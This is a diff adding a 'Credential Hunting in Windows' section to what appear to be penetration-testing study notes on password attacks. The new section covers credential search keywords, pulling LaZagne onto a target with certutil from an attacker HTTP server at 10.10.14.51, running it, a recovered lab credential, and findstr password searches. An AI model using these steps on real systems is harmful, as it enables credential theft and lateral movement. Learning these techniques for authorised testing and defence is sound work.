@@ -22,6 +22,7 @@ This document outlines common techniques used in **password attacks**. It is int
     - [Attacking Windows Credential Manager](#attacking-windows-credential-manager)
     - [Attacking Active Directory and NTDS.dit](#attacking-active-directory-and-ntdsdit)
     - [Credential Hunting in Windows](#credential-hunting-in-windows)
+  - [Extracting Password from Linux Systems](#extracting-password-from-linux-systems)
 
 ---
 
@@ -1163,7 +1164,7 @@ If successful, this reveals usernames, domains, and sometimes plaintext password
 
 ---
 
-### Attacking Active Directory and NTDS.dit'
+### Attacking Active Directory and NTDS.dit
 
 **Active Directory (AD)** is the primary directory service used in modern Windows enterprise environments. If a target organization uses Windows systems at scale, it is safe to assume AD is present.
 
@@ -1350,3 +1351,102 @@ Recovered password:
 ---
 
 ### Credential Hunting in Windows
+
+After gaining access to a target system, credential hunting can often lead to rapid privilege escalation or lateral movement. Credential hunting refers to systematically searching the filesystem and memory for stored credentials, configuration secrets, and authentication artifacts.
+
+**Common Search Keywords**
+
+- Passwords
+- Passphrases
+- Keys
+- Username
+- User account
+- Creds
+- Users
+- Passkeys
+- configuration
+- dbcredential
+- dbpassword
+- pwd
+- Login
+- Credentials
+- gitlab
+
+These terms are commonly found in configuration files, scripts, backups, and documentation.
+
+**Manual Searching via GUI**
+
+With GUI access, Windows Search can quickly uncover sensitive files:
+
+![Filtered output](./.images/windows-search.PNG)
+
+This is useful for locating:
+
+- Configuration files
+- Backup archives
+- Scripts
+- Credential exports
+
+**Automated Credential Discovery with LaZagne**
+
+[LaZagne](https://github.com/AlessandroZ/LaZagne/releases/) is a post-exploitation credential recovery tool that targets a wide range of applications and Windows subsystems. It consists of multiple modules, including:
+
+- browsers
+- chats
+- mails
+- memory
+- sysadmin
+- windows
+- wifi
+
+**Transferring LaZagne to the Target**
+
+Start an HTTP server on the attacker machine:
+
+```bash
+python3 -m http.server 8001
+```
+
+Download the executable on the target using `certutil`:
+
+```
+certutil.exe -urlcache -split -f http://10.10.14.51:8001/LaZagne.exe
+```
+
+Execute LaZagne with all modules enabled:
+
+```powershell
+start LaZagne.exe all
+```
+
+Recovered credentials:
+
+```
+ubuntu:FSadmin123
+```
+
+![Filtered output](./.images/lazagne.PNG)
+
+**Searching Files with Findstr**
+
+The Windows `findstr` utility can be used to recursively search files for credential-related strings. This is equivalent to Linux `grep`.
+
+Example:
+
+```powershell
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+```
+
+![Filtered output](./.images/findstr.PNG)
+
+This technique is effective for discovering:
+
+- Hardcoded credentials
+- Database connection strings
+- API keys
+- Git configuration files
+- PowerShell scripts
+
+---
+
+## Extracting Password from Linux Systems
